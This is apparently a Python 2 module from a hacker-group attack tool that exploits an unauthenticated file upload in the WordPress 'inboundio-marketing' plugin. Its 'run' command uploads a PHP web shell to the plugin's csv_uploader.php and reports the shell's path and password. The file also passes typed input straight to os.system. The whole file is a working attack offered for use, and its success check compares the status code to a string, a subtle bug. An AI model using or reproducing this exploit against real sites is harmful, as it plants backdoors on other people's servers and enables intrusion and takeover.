# -*- coding: utf-8 -*-

'''
Wordpress Testing In Boundio Marketing Exploit
Coded By ./Xi4u7
AndroSec1337 Cyber Team
https://www.facebook.com/Xi4u7
'''

import os
import subprocess
from core.wcolors import color
from core import help
from time import sleep
from core import log
from core import about
from core import wcolors
import requests
options = ["http://test.com/"]

def ibm():
	try:
		line_1 = color.RED + "[" + color.CYAN + "XioChi" + color.RED + "]" +  color.ENDC
		line_1 += color.RED + "[" + color.CYAN + "wordpress/inboundiomarketing" + color.RED + "]>> " + color.ENDC
		com = raw_input(line_1)
		com = com.lower()
		if com[0:10] =='set target':
			target_ip = com[11:40]
			options[0] = target_ip
			print color.RED + "[" + color.CYAN + "Target" + color.RED + "]>> " + options[0]
			ibm()
		elif com[0:12] =='show options':
			print ""
			print wcolors.color.CYAN+"Options\t\t Value\t\t\tRQ\t Description"
			print wcolors.color.RED+"---------\t--------------\t\t------------------"
			print wcolors.color.CYAN+"Target\t\t"+options[0]+"\tyes\tTarget ip addres"
			ibm()
		elif com[0:2] =='os':
			log.logger.single("Command Executed", "\n"+color.CYAN)
			os.system(com[3:])
			ibm()
		elif com[0:4] =='help':
			help.help()
			ibm()
		elif com[0:4] =='back':
			pass
		elif com[0:5] =='about':
			about.about()
			ibm()
		elif com[0:3] =='run':
			log.logger.attack('Wordpress In Boundio Marketing Started!')
			exploit = "/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
			file = open("core/shell/XioChi.php","rb")
			url = options[0]
			post = {"file": file}
			try:
				gg = requests.post(url+exploit, files=post)
				cek = requests.get(url+"/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/XioChi.php")
				if cek.status_code == "200":
					log.logger.attacksukses("Vulnerable")
					log.logger.attacksukses("Shell Path : /wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/XioChi.php")
					log.logger.attacksukses("Password Shell : jancox")
				else:
					log.logger.error("Not Vulnerable! Exploiting Failed!")
			except Exception as e:
				print(e)
				ibm()
		else:
			print color.RED + "[" + color.CYAN + "Wrong Command" + color.RED + "]>>" + com
			ibm()
	except(KeyboardInterrupt):
		print ""
